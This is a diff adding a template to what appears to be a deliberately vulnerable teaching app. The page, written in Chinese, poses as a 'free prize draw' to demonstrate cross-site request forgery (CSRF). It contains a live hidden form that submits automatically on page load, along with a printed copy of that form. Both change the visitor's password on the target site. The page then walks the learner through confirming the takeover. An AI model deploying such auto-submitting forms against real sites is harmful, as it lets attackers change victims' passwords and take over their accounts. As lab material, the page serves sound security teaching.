@@ -1,0 +1,46 @@
+{% extends "vuln4all/base.html" %}
+{% block title %}免费抽奖！{% endblock %}
+
+{% block content %}
+<h1>🎉 恭喜你中奖了</h1>
+<p>这是一张攻击者放的「免费抽奖」页面。它看起来人畜无害，但页面一打开，
+它就用<strong>你的浏览器</strong>去访问别处的接口了。</p>
+
+<h2>它正在干什么</h2>
+<pre class="payload">&lt;form action="{{ target }}" method="POST"&gt;
+  &lt;input type="hidden" name="new_password" value="{{ evil_password }}"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+
+<p class="muted">
+  注意它改的接口地址是 {{ target }}
+  —— 和你刚才登录的个人中心是同一个站。浏览器会把你的 session cookie
+  一起带过去，服务端就以为是你本人在改密码。
+</p>
+
+<p>
+  <strong>手动触发：</strong>
+  <button class="btn" onclick="document.getElementById('csrf-form').submit()">再来一次</button>
+</p>
+
+<!-- 真正的攻击载荷。target=_blank 是为了让你能立刻看到结果 -->
+<form id="csrf-form" action="{{ target }}" method="POST" target="_blank" style="display:none">
+  <input type="hidden" name="new_password" value="{{ evil_password }}">
+</form>
+
+<script>
+  // 自动提交 —— 这正是 CSRF 的可怕之处：你什么都不用点
+  document.getElementById('csrf-form').submit();
+</script>
+
+<h2>接下来</h2>
+<ol>
+  <li>回到 <a href="{{ victim_url }}">个人中心</a>（如果弹出了新标签，那里面会直接显示改密码的结果）</li>
+  <li>按「退出」把自己退出去</li>
+  <li>再用 <span class="mono">bob / password123</span> 登录 —— 登不上了</li>
+  <li>试试用 <span class="mono">{{ evil_password }}</span> 当密码登录 —— 进去了</li>
+</ol>
+<p class="muted">
+  你从头到尾都没碰过「修改密码」那个按钮，密码却变了。这就是这一题要你体会的东西。
+</p>
+{% endblock %}
